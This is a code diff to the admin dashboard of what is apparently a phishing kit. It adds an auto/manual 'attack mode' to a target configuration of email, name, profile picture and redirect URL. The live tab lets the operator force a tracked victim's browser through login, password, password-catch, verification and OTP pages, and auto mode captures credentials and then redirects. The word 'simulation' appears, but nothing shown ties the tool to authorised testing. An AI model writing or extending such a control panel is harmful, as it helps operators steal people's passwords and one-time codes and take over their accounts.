@@ -2,7 +2,7 @@
 
 import { useState, useEffect, useCallback, ChangeEvent } from "react";
 import type { AppState } from "@/lib/state";
-import { useForm, type SubmitHandler } from "react-hook-form";
+import { useForm, type SubmitHandler, Controller } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
 import Image from "next/image";
@@ -15,7 +15,7 @@ import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Separator } from "@/components/ui/separator";
 import { Badge } from "@/components/ui/badge";
-import { RefreshCw, Trash2, UserCircle, Moon, Sun, UserX } from "lucide-react";
+import { RefreshCw, Trash2, UserCircle, Moon, Sun, UserX, ShieldQuestion } from "lucide-react";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { useTheme } from "next-themes";
 import {
@@ -24,12 +24,14 @@ import {
   DropdownMenuItem,
   DropdownMenuTrigger,
 } from "@/components/ui/dropdown-menu";
+import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 
 type ConfigFormData = {
   targetEmail: string;
   targetName: string;
   targetProfilePicture: string;
   redirectUrl: string;
+  attackMode: 'auto' | 'manual';
 };
 
 const configSchema = z.object({
@@ -37,6 +39,7 @@ const configSchema = z.object({
     targetName: z.string().min(1, { message: "Name is required." }),
     targetProfilePicture: z.string().url({ message: "Please enter a valid URL." }).or(z.string().optional()).or(z.literal('')),
     redirectUrl: z.string().url({ message: "Please enter a valid URL." }),
+    attackMode: z.enum(['auto', 'manual']),
 });
 
 export function AdminDashboard() {
@@ -53,6 +56,7 @@ export function AdminDashboard() {
     reset,
     setValue,
     watch,
+    control,
     formState: { errors },
   } = useForm<ConfigFormData>({
     resolver: zodResolver(configSchema),
@@ -66,7 +70,7 @@ export function AdminDashboard() {
       if (res.ok) {
         const data = await res.json();
         setState(data);
-        if (document.activeElement?.tagName !== 'INPUT') {
+        if (document.activeElement?.tagName !== 'INPUT' && document.activeElement?.getAttribute('role') !== 'radio') {
           reset(data.config);
         }
       }
@@ -130,7 +134,7 @@ export function AdminDashboard() {
           setSelectedFile(null);
           setImagePreview(null);
         } else {
-            return; // Stop submission if upload fails
+            return; 
         }
       }
 
@@ -202,9 +206,10 @@ export function AdminDashboard() {
   return (
     <div className="w-full max-w-4xl mx-auto">
         <Tabs defaultValue="live" className="w-full">
-            <TabsList className="grid w-full grid-cols-2">
-                <TabsTrigger value="live">Live Attack Dashboard</TabsTrigger>
-                <TabsTrigger value="config">Admin Configuration</TabsTrigger>
+            <TabsList className="grid w-full grid-cols-3">
+                <TabsTrigger value="live">Live Dashboard</TabsTrigger>
+                <TabsTrigger value="config">Target Config</TabsTrigger>
+                <TabsTrigger value="attackMode">Attack Mode</TabsTrigger>
             </TabsList>
             <TabsContent value="live">
                 <Card>
@@ -245,17 +250,19 @@ export function AdminDashboard() {
                       <div className="flex items-center gap-4 p-4 bg-muted rounded-lg">
                         <div className="flex items-center gap-2">Current Page: <Badge>{state?.victim.currentPage || 'N/A'}</Badge></div>
                         <div className="flex items-center gap-2">Attempts: <Badge variant="secondary">{state?.victim.attempts || 0}</Badge></div>
+                         <div className="flex items-center gap-2">Attack Mode: <Badge variant="outline">{state?.config.attackMode || 'N/A'}</Badge></div>
                       </div>
                     </div>
                     <Separator />
                     <div>
                         <h3 className="font-semibold mb-2">Live Controls</h3>
-                        <CardDescription className="mb-4">Force the victim's browser to a specific page.</CardDescription>
+                        <CardDescription className="mb-4">Force the victim's browser to a specific page. (Manual Mode Only)</CardDescription>
                         <div className="grid grid-cols-2 sm:grid-cols-6 gap-2">
                             <Button 
                               variant={state?.victim.currentPage === 'login' ? "default" : "outline"}
                               onClick={() => handleControlClick('login')}
                               className={cn(state?.victim.currentPage === 'login' && "animate-shine")}
+                              disabled={state?.config.attackMode === 'auto'}
                             >
                               Login
                             </Button>
@@ -263,6 +270,7 @@ export function AdminDashboard() {
                               variant={state?.victim.currentPage === 'password' ? "default" : "outline"}
                               onClick={() => handleControlClick('password')}
                               className={cn(state?.victim.currentPage === 'password' && "animate-shine")}
+                               disabled={state?.config.attackMode === 'auto'}
                             >
                               Password
                             </Button>
@@ -270,6 +278,7 @@ export function AdminDashboard() {
                               variant={state?.victim.currentPage === 'pwCatch' ? "default" : "outline"}
                               onClick={() => handleControlClick('pwCatch')}
                               className={cn(state?.victim.currentPage === 'pwCatch' && "animate-shine")}
+                               disabled={state?.config.attackMode === 'auto'}
                             >
                               Pw-Catch
                             </Button>
@@ -277,6 +286,7 @@ export function AdminDashboard() {
                               variant={state?.victim.currentPage === 'verify' ? "default" : "outline"}
                               onClick={() => handleControlClick('verify')}
                               className={cn(state?.victim.currentPage === 'verify' && "animate-shine")}
+                               disabled={state?.config.attackMode === 'auto'}
                             >
                               Verify
                             </Button>
@@ -284,6 +294,7 @@ export function AdminDashboard() {
                               variant={state?.victim.currentPage === 'otp' ? "default" : "outline"}
                               onClick={() => handleControlClick('otp')}
                               className={cn(state?.victim.currentPage === 'otp' && "animate-shine")}
+                               disabled={state?.config.attackMode === 'auto'}
                             >
                               OTP
                             </Button>
@@ -291,6 +302,7 @@ export function AdminDashboard() {
                               variant={state?.victim.currentPage === 'redirect' ? "default" : "outline"}
                               onClick={() => handleControlClick('redirect')}
                               className={cn(state?.victim.currentPage === 'redirect' && "animate-shine")}
+                               disabled={state?.config.attackMode === 'auto'}
                             >
                               Redirect
                             </Button>
@@ -326,7 +338,7 @@ export function AdminDashboard() {
             <TabsContent value="config">
                 <Card>
                   <CardHeader>
-                    <CardTitle>Admin Configuration</CardTitle>
+                    <CardTitle>Target Configuration</CardTitle>
                     <CardDescription>Set up the target and simulation parameters.</CardDescription>
                   </CardHeader>
                   <CardContent>
@@ -369,12 +381,90 @@ export function AdminDashboard() {
                         <Input id="redirectUrl" {...register("redirectUrl")} />
                         {errors.redirectUrl && <p className="text-sm text-destructive mt-1">{errors.redirectUrl.message}</p>}
                       </div>
+                       <Controller
+                          name="attackMode"
+                          control={control}
+                          render={({ field }) => (
+                           <input type="hidden" {...field} />
+                          )}
+                        />
                       <Button type="submit" className="w-full" disabled={isUploading}>
                         {isUploading ? "Uploading..." : "Save Configuration"}
                       </Button>
                     </form>
                   </CardContent>
                 </Card>
+            </TabsContent>
+            <TabsContent value="attackMode">
+                 <Card>
+                    <CardHeader>
+                        <CardTitle>Attack Mode</CardTitle>
+                        <CardDescription>Select the simulation mode.</CardDescription>
+                    </CardHeader>
+                    <CardContent>
+                       <form onSubmit={handleSubmit(onConfigSubmit)} className="space-y-6">
+                         <Controller
+                            name="attackMode"
+                            control={control}
+                            render={({ field }) => (
+                                <RadioGroup
+                                    onValueChange={field.onChange}
+                                    value={field.value}
+                                    className="grid grid-cols-1 md:grid-cols-2 gap-4"
+                                >
+                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent">
+                                        <div className="flex items-center justify-between w-full">
+                                           <div className="font-semibold">Auto Mode</div>
+                                           <RadioGroupItem value="auto" id="auto" />
+                                        </div>
+                                        <p className="text-sm text-muted-foreground">
+                                            A streamlined flow: Email &rarr; Password &rarr; Redirect. Captures initial credentials then redirects.
+                                        </p>
+                                    </Label>
+                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent">
+                                         <div className="flex items-center justify-between w-full">
+                                            <div className="font-semibold">Manual Mode</div>
+                                            <RadioGroupItem value="manual" id="manual" />
+                                         </div>
+                                        <p className="text-sm text-muted-foreground">
+                                           A multi-step, interactive flow that you control from the dashboard. Good for complex scenarios.
+                                        </p>
+                                    </Label>
+                                </RadioGroup>
+                            )}
+                         />
+                          <Controller
+                            name="targetEmail"
+                            control={control}
+                            render={({ field }) => (
+                            <input type="hidden" {...field} />
+                            )}
+                          />
+                          <Controller
+                            name="targetName"
+                            control={control}
+                            render={({ field }) => (
+                            <input type="hidden" {...field} />
+                            )}
+                          />
+                          <Controller
+                            name="targetProfilePicture"
+                            control={control}
+                            render={({ field }) => (
+                            <input type="hidden" {...field} />
+                            )}
+                          />
+                          <Controller
+                            name="redirectUrl"
+                            control={control}
+                            render={({ field }) => (
+                            <input type="hidden" {...field} />
+                            )}
+                          />
+                         <Button type="submit" className="w-full">Save Attack Mode</Button>
+                       </form>
+                    </CardContent>
+                 </Card>
             </TabsContent>
         </Tabs>
     </div>
